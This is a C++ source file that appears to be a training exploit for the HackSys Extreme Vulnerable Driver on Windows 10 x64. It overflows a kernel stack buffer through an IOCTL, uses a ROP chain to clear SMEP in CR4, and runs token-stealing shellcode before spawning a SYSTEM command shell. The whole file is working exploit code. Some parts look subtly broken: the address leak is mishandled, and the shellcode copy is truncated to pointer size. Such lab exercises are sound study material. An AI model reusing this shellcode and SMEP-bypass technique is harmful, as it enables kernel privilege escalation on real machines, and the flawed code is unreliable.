// bof_windows10_x64_rs4.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <Psapi.h>
#include <stdio.h>

#define HEVD_DEVICE_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
#define BOF_IOCTL 0x222003

/* gadgets */
#define POP_RCX 0x488448
#define MOV_CR4_RCX 0x4909c3

HANDLE hHevdDevice; 
BOOL bDevCntrl;

HANDLE GetDevice()
{
	/* no error checking because the condition will be true all the time.. i guess.. :} */
	return CreateFileA(
		HEVD_DEVICE_NAME,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
		);
}

unsigned long long leak()
{
	DWORD cb;
	DWORD ret;
	unsigned long long* ptrs;

	EnumDeviceDrivers(&ptrs, &cb, &ret);
	
	return (unsigned long long)&ptrs[0];
}

void Exploit(HANDLE dev)
{
	unsigned long long ntBase;

	/* big thanks to @33y0re(Connor McGarr for the shellcode (i am too lazy for this :/) */
	char shellcode[] =
		"\x65\x48\x8B\x04\x25\x88\x01\x00\x00"
		"\x48\x8B\x80\xB8\x00\x00\x00"
		"\x48\x89\xC3"
		"\x48\x8B\x9B\xE8\x02\x00\x00"
		"\x48\x81\xEB\xE8\x02\x00\x00"
		"\x48\x8B\x8B\xE0\x02\x00\x00"
		"\x48\x83\xF9\x04"
		"\x75\xE5"
		"\x48\x8B\x8B\x58\x03\x00\x00"
		"\x80\xE1\xF0"
		"\x48\x89\x88\x58\x03\x00\x00"
		"\x48\x83\xC4\x40"
		"\xC3";

	char buf[2088];

	LPVOID page = VirtualAlloc(NULL,
		sizeof(shellcode),
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READWRITE);

	if (page == NULL)
	{
		printf("[-] VirtualAlloc() failed...\n");
		exit(-1);
	}

	ntBase = leak();

	memset(buf, 'A', sizeof(buf));
	memcpy_s(page, sizeof(page), shellcode, sizeof(shellcode));

	*(unsigned long long*)(buf + 2056) = (unsigned long long)ntBase + POP_RCX;
	*(unsigned long long*)(buf + 2064) = 0x70678;
	*(unsigned long long*)(buf + 2072) = (unsigned long long)ntBase + MOV_CR4_RCX; 
	*(unsigned long long*)(buf + 2080) = (unsigned long long)page;
	
	bDevCntrl = DeviceIoControl(dev, BOF_IOCTL, buf, sizeof(buf), 0, 0, NULL, NULL);

	printf("Exploiting...\n");
	Sleep(1000);
	printf("[*] Device Handle: 0x%p\n", &dev);
	printf("[*] Calling DeviceIoControl()...\n");

	printf("[*] Nt base: 0x%llx\n", ntBase);

	printf("[GADGETS]\n");
	printf("\t pop rcx: 0x%llx\n", ntBase + POP_RCX);
	printf("\t mov cr4, rcx: 0x%llx\n", ntBase + MOV_CR4_RCX);

	Sleep(2000);
	CloseHandle(dev);
	VirtualFree(page, sizeof(page), MEM_RELEASE);
	system("cmd.exe /k cd C:\\");
}

int main()
{
	hHevdDevice = GetDevice();
	Exploit(hHevdDevice);
	
	return 0; 
}

